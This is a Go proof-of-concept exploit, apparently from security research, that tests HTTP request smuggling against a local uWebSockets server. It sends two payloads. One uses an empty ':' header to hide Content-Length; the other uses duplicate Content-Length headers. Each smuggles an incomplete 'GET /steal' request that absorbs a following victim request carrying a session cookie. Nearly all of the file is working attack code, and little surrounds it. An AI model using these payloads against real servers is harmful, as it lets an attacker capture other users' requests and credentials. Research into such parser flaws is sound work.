package main

import (
	"fmt"
	"net"
	"time"
)

func read(c net.Conn, tag string) {
	c.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
	buf := make([]byte, 4096)
	n, _ := c.Read(buf)
	if n > 0 {
		fmt.Printf("  <%s response %d bytes>\n%s\n", tag, n, indent(string(buf[:n])))
	} else {
		fmt.Printf("  <%s: no response (uWS is buffering / waiting)>\n", tag)
	}
}
func indent(s string) string {
	out := "    | "
	for _, r := range s {
		if r == '\n' { out += "\n    | " } else { out += string(r) }
	}
	return out
}

func vector(name, attacker, victim string) {
	fmt.Printf("\n========== VECTOR: %s ==========\n", name)
	c, err := net.Dial("tcp", "127.0.0.1:9001")
	if err != nil { fmt.Println("dial err", err); return }
	defer c.Close()
	fmt.Println(">> ATTACKER burst")
	c.Write([]byte(attacker))
	read(c, "attacker")
	time.Sleep(100 * time.Millisecond)
	fmt.Println(">> VICTIM burst (same backend connection)")
	c.Write([]byte(victim))
	read(c, "victim")
}

func main() {
	CRLF := "\r\n"
	victim := "GET /account HTTP/1.1" + CRLF + "Host: t" + CRLF + "Cookie: victim-secret-cookie" + CRLF + CRLF

	// Sanity baseline
	vector("baseline (normal pipelined requests)",
		"GET /a HTTP/1.1"+CRLF+"Host: t"+CRLF+CRLF, victim)

	// Empty-header ':' hides Content-Length -> uWS thinks body=0 -> the "body" is parsed as a smuggled request
	emptyHdr := "POST /benign HTTP/1.1" + CRLF + "Host: t" + CRLF + ":" + CRLF + "Content-Length: 42" + CRLF + CRLF +
		"GET /steal HTTP/1.1" + CRLF + "X-Smuggled: " // incomplete: absorbs victim
	vector("empty-header ':' (CL hidden)", emptyHdr, victim)

	// Duplicate Content-Length: uWS uses FIRST (6); trailing bytes smuggled
	dupCL := "POST /benign HTTP/1.1" + CRLF + "Host: t" + CRLF + "Content-Length: 6" + CRLF + "Content-Length: 43" + CRLF + CRLF +
		"HELLO!" + "GET /steal HTTP/1.1" + CRLF + "X-Smuggled: "
	vector("duplicate Content-Length (uWS uses first=6)", dupCL, victim)
}
